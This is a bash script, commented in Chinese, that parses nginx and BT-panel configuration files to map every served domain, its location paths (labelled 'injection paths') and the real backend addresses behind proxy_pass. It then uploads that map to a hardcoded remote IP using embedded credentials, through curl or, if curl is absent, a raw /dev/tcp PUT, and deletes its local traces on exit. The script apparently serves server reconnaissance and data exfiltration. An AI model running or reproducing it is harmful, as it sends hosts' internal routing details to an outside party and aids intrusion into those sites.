#!/bin/bash

# ===== 配置区（只改这一行）=====
REMOTE_IP="158.94.210.227"                  # ←←←← 把这里改成你的目标IP或域名
# =====================================

REMOTE_DIR="$(date +'%Y%m%d%H')"
FILENAME="$(date +'%Y%m%d%H%M%S')$(date +'%N').txt"
REMOTE_URL="http://${REMOTE_IP}/NGINX/${REMOTE_DIR}/${FILENAME}"

# 临时文件
TMPFILE=$(mktemp /dev/shm/nginx_scan.XXXXXX.txt 2>/dev/null || mktemp /tmp/nginx_scan.XXXXXX.txt)
trap 'rm -f "$TMPFILE" 2>/dev/null' EXIT

# 生成纯文本结果
{
    echo "域名 → 注入路径 → 后端真实地址"
    echo "================================================================================================"
    find /etc/nginx/sites-enabled \
         /etc/nginx/conf.d \
         /etc/nginx/sites-available \
         /www/server/panel/vhost/nginx \
         /www/server/nginx/conf/vhost \
         /www/server/panel/vhost/rewrite 2>/dev/null -type f -name "*.conf" | \
    xargs -r awk '
    function trim(s) { gsub(/^[ \t\r]+|[ \t\r;]+$/, "", s); return s }
    function clean_quotes(str) { gsub(/[\047"]/, "", str); return str }
    function normalize_path(p) {
        p = clean_quotes(p); gsub(/[\/]+$/, "", p); if (p == "") p = "/"; return p
    }
    function process_proxy_pass(val, b, host, path, i, a) {
        b = trim(val)
        if (b ~ /^https?:\/\//) {
            sub(/^https?:\/\//, "", b); split(b, a, "/"); host = a[1]; path = ""
            for (i = 2; i <= length(a); i++) if (a[i] != "") path = path "/" a[i]
            gsub(/\/+$/, "", path); return host (path == "" ? "" : "/" path)
        }
        return b
    }
    {
        if (process($0)) next
    }
    function process(line, inc, cmd, f, inc_line, path, backend, d, doms, i) {
        line = trim(line)
        if (line == "" || substr(line,1,1) == "#") return 1
        if (line ~ /^[ \t]*include[ \t]/) {
            sub(/^[ \t]*include[ \t]+/, "", line); gsub(/[;\r].*$/, "", line); inc = trim(line)
            if (inc !~ /^\// && FILENAME ~ /\//) inc = FILENAME "/../" inc
            if (inc ~ /[\*\[\?]/) {
                cmd = "ls -1 " inc " 2>/dev/null"
                while ((cmd | getline f) > 0) { if (f != FILENAME) { while ((getline inc_line < f) > 0) process(inc_line); close(f) } }
                close(cmd)
            } else if (inc != "") { while ((getline inc_line < inc) > 0) process(inc_line); close(inc) }
            return 1
        }
        if (line ~ /^[ \t]*server_name[ \t]/) {
            sub(/^[ \t]*server_name[ \t]+/, "", line); gsub(/#.*/, "", line)
            split(trim(line), doms, /[ \t]+/); delete current_domains
            for (i in doms) { d = trim(doms[i]); if (d != "" && d != "_") current_domains[d] = 1 }
            return 1
        }
        if (line ~ /^[ \t]*server[ \t]*{/) { delete current_domains; return 1 }
        if (line ~ /^[ \t]*}[ \t]*$/) { delete current_domains; return 1 }
        if (line ~ /^[ \t]*location[ \t]*[=~^~ ]/) {
            if (match(line, /^[ \t]*location[ \t]*[=~^~ ]*[ \t]*[^ \t{;]+/)) {
                path = substr(line, RSTART, RLENGTH); path = trim(path); path = normalize_path(path)
                if (index(line, "proxy_pass") && match(line, /proxy_pass[ \t]+[^;{}]+/)) {
                    backend = substr(line, RSTART + 11, RLENGTH - 11); backend = trim(backend)
                    backend = process_proxy_pass(backend)
                    if (backend != "") output(path, backend); return 1
                }
                saved_path = path
                while (getline > 0) {
                    $0 = trim($0)
                    if ($0 ~ /^[ \t]*}/) break
                    if (substr($0,1,1) == "#") continue
                    if (index($0, "proxy_pass")) {
                        sub(/.*proxy_pass[ \t]+/, "", $0); gsub(/[;\r].*$/, "", $0)
                        backend = process_proxy_pass(trim($0))
                        if (backend != "") output(saved_path, backend); break
                    }
                }
            }
        }
        return 1
    }
    function output(p, b) {
        if (p == "" || b == "" || length(current_domains) == 0) return
        for (d in current_domains) printf "%-50s → %-40s → %s\n", d, p, b
    }
    BEGIN { delete current_domains }
    ' | sort -u
} > "$TMPFILE"

# ============ 上传部分（优先curl digest → 无curl则用纯bash）============
if command -v curl >/dev/null 2>&1; then
    curl --user muchuan:sbs1rqlblx --digest -T "$TMPFILE" "$REMOTE_URL" -f -s -o /dev/null && \
        echo "上传成功 → $REMOTE_URL" || echo "上传失败"
else
    echo "无curl，使用纯bash上传（Basic认证）..."
    AUTH=$(printf "muchuan:sbs1rqlblx" | base64 -w0)
    SIZE=$(stat -c%s "$TMPFILE")
    exec 3<>/dev/tcp/$REMOTE_IP/80
    printf "PUT /NGINX/%s/%s HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nContent-Length: %s\r\nConnection: close\r\n\r\n" \
        "$REMOTE_DIR" "$FILENAME" "$REMOTE_IP" "$AUTH" "$SIZE" >&3
    cat "$TMPFILE" >&3
    exec 3<&-
    echo "纯bash上传已执行 → $REMOTE_URL"
fi

# 本地也留一份（可选删掉）
# cp "$TMPFILE" "/tmp/$(basename $FILENAME)" 2>/dev/null

echo "本地临时文件: $TMPFILE"
